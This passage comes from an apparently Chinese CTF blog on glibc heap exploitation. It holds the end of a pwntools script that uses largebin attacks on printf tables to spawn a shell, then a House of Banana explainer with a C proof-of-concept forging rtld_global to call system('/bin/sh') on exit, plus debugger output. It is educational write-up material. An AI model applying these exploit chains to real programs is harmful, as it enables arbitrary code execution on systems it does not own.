system&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;First Add Done.Thx 4 Use. Save ID:&#x27;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;key &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = (leak_addr ^ key) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = (leak_addr ^ key)-<span class="number">656</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">one_gadget_list=[<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>,<span class="number">0xe6ce3</span>,<span class="number">0xe6ce6</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">3</span>]+libc_base</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">global_max_fast=libc_base+<span class="number">2026368</span></span><br><span class="line">main_arena_start=libc_base+<span class="number">2014080</span></span><br><span class="line">__printf_function_table=main_arena_start+<span class="number">0x5478</span></span><br><span class="line">__printf_arginfo_table=main_arena_start+<span class="number">0x57d0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;one_gadget &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&#x27;system_libc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">success(<span class="string">&#x27;global_max_fast &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(global_max_fast))</span><br><span class="line">success(<span class="string">&#x27;main_arena_start &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(main_arena_start))</span><br><span class="line">success(<span class="string">&#x27;__printf_function_table &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(__printf_function_table))</span><br><span class="line">success(<span class="string">&#x27;__printf_arginfo_table &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(__printf_arginfo_table))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">2015200</span></span><br><span class="line">main_arena2=libc_base+<span class="number">2015328</span></span><br><span class="line">chunk0_addr=heap_base+<span class="number">656</span></span><br><span class="line">chunk2_addr=heap_base+<span class="number">2848</span></span><br><span class="line">chunk10_addr=heap_base+<span class="number">9632</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload1= p64(main_arena)+p64(main_arena)</span><br><span class="line">payload1+=p64(chunk2_addr)+p64(__printf_function_table-<span class="number">0x20</span>)</span><br><span class="line">payload2= p64(main_arena)+p64(main_arena)</span><br><span class="line">payload2+=p64(chunk2_addr)+p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload1)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x650</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x440</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x660</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x660</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x660</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x800</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload2= p64(main_arena2)+p64(main_arena2)</span><br><span class="line">payload2+=p64(chunk10_addr)+p64(__printf_arginfo_table-<span class="number">0x20</span>)</span><br><span class="line">recover(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>,payload2)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x800</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">fake_printf_arginfo_table=<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">fake_printf_arginfo_table=fake_printf_arginfo_table.ljust((<span class="number">115</span>-<span class="number">2</span>)*<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_printf_arginfo_table+=p64(system_libc)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,fake_printf_arginfo_table)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">show(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>本题目很灵活，可以用多种方法求解，于是我把学过的技术都用了一遍（House Of Pig 还没有搞过）</p>
<ul>
<li>House Of Banana：<ul>
<li>本地还好，不过远程需要爆破 ld_base </li>
</ul>
</li>
<li>mp_.tcache_bins劫持 + Tcache attack：<ul>
<li>最简单的办法，复习了一下 tcache attack</li>
</ul>
</li>
<li>House Of Husk：<ul>
<li>好不容易成功进行了两次 largebin attack，最后还是因为各种原因没有打出来</li>
<li>两次 largebin attack 真的有点不容易，关键就是在第一次攻击后，让被修改的那个 large chunk 复原，然后才开始第二次攻击</li>
<li>因为 printf 里面会控制 Rdi 寄存器，所以只能考虑用“one_gadget”，但是 libc-2.31 的“one_gadget” 条件苛刻，所以就失败了</li>
</ul>
</li>
</ul>
<p>以后会优先考虑 mp_.tcache_bins劫持，然后才是 House Of Husk，House Of Banana</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/House%20Of%20Banana-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/09/House%20Of%20Banana-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Banana-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-09 19:01:29 / Modified: 23:45:40" itemprop="dateCreated datePublished" datetime="2022-04-09T19:01:29+08:00">2022-04-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Banana"><a href="#House-Of-Banana" class="headerlink" title="House Of Banana"></a>House Of Banana</h2><p>libc-2.28：_int_malloc 中增加了对 unsorted bin 的BK的校验，使得 unsorted bin attack 变得不可行</p>
<p>libc-2.29：检查变得更加严格，house of strom 不能用了</p>
<p>libc-2.30：常规 large bin attack 方法也被限制（以前可以改两个地址，现在只能改一个了）</p>
<p>house of banana 适用场景：（满足任一条件即可）</p>
<ul>
<li>程序能够显式的执行exit函数</li>
<li>程序通过 libc_start_main 启动的主函数，且主函数能够结束</li>
</ul>
<hr>
<h2 id="House-Of-Banana-原理"><a href="#House-Of-Banana-原理" class="headerlink" title="House Of Banana 原理"></a>House Of Banana 原理</h2><p>在 ld.so 里，存在一个 <code>_rtld_global</code> 指针，指向 <code>rtld_global</code> 结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">libc_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> hashval;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="keyword">size_t</span> size;</span><br><span class="line">      <span class="keyword">size_t</span> n_elements;</span><br><span class="line">      <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="keyword">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，该结构体存储着的实际就是elf各段的符号结构体（我们较为关注的是 fini_array 段的动态链接结构体指针）</p>
<p>fini_array 段的动态链接结构体指针会在以下代码中被使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，伪造该结构体指针，可以使得 array 指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流</p>
<p>那么 house of banana 的思想就是利用 large bin attack 往 rtld_global 写入堆的地址，并事先在堆里伪造好 rtld_global 结构体，这样程序 exit 或者正常退出 main 函数时，便会执行到伪造的 fini_array 数组</p>
<h2 id="House-Of-Banana-利用姿势"><a href="#House-Of-Banana-利用姿势" class="headerlink" title="House Of Banana 利用姿势"></a>House Of Banana 利用姿势</h2><p>案例一：间接利用“rtld_global”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">getLibcBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">uint64_t</span> to;</span><br><span class="line">   <span class="keyword">uint64_t</span> from;</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">   </span><br><span class="line">   FILE* file;</span><br><span class="line">   <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="keyword">int</span>)getpid()); </span><br><span class="line">   file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">          fclose(file);</span><br><span class="line">          <span class="keyword">return</span> from;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> libcBase = getLibcBase();</span><br><span class="line">	<span class="keyword">uint64_t</span> rtld_global = libcBase+<span class="number">0x1fa000</span>+<span class="number">0x2E060</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span>* next_node = (<span class="keyword">uint64_t</span>*)(rtld_global<span class="number">-0x35f48</span>);   </span><br><span class="line">    <span class="comment">/* distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>); <span class="comment">/* 为了触发 largebin attack */</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>); <span class="comment">/* p1-&gt;size和p2-&gt;size必须不相同 */</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> fake = (<span class="keyword">uint64_t</span>)p2<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="keyword">uint64_t</span>)shell;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;</span><br><span class="line">	*(<span class="keyword">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;libcBase is 0x%lx\n&quot;</span>,libcBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rtld_global is 0x%lx\n&quot;</span>,rtld_global);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="keyword">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//force p1 insert in to the largebin</span></span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	p1[<span class="number">3</span>] = ((<span class="keyword">uint64_t</span>)next_node <span class="number">-0x20</span>); <span class="comment">//push p2 into unsoteded bin</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">	p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	p2[<span class="number">3</span>] = fake;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 gcc ./test.c -o test -g                                                   </span><br><span class="line">➜  桌面 patchelf --<span class="built_in">set</span>-interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64/ld<span class="number">-2.31</span>.so --<span class="built_in">set</span>-rpath /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9_amd64 test</span><br><span class="line">➜  桌面 ./test                                                                   </span><br><span class="line">libcBase is <span class="number">0x7f678f5f5000</span></span><br><span class="line">rtld_global is <span class="number">0x7f678f81d060</span></span><br><span class="line">$ whoami</span><br><span class="line">yhellow</span><br></pre></td></tr></table></figure>
<p>这里先说一下这两个关键的偏移（“rtld_global”，“next_node”）是怎么得出来的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line"><span class="number">0x7ffff7ffd060</span>-&gt;<span class="number">0x7ffff7fc7118</span> is <span class="number">-0x35f48</span> bytes (<span class="number">-0x6be9</span> words)</span><br></pre></td></tr></table></figure>
<p>先计算“rtld_global”的偏移，然后“next_node”的偏移也计算出来了</p>
<p>这种类型的 House Of Banana 是针对“next_node”进行攻击的，利用 largebin attack 在“next_node”中写入“fake”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/xg fake</span><br><span class="line"><span class="number">0x55555555bcd0</span>:	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; telescope *next_node <span class="comment">/* next_node-&gt;fake */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax <span class="number">0x55555555bcd0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55555555bcd8</span> ◂— <span class="number">0x421</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x55555555bce0</span> —▸ <span class="number">0x7ffff7fc0fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7ffff7fc0fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7ffff7fc0fb0</span> (main_arena+<span class="number">1072</span>) —▸ <span class="number">0x7ffff7fc0fa0</span> (main_arena+<span class="number">1056</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55555555bce8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55555555bcf0</span> —▸ <span class="number">0x55555555b880</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rdx <span class="number">0x55555555bcf8</span> —▸ <span class="number">0x55555555bcd0</span> ◂— <span class="number">0x0</span> <span class="comment">/* fake+0x28 */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span 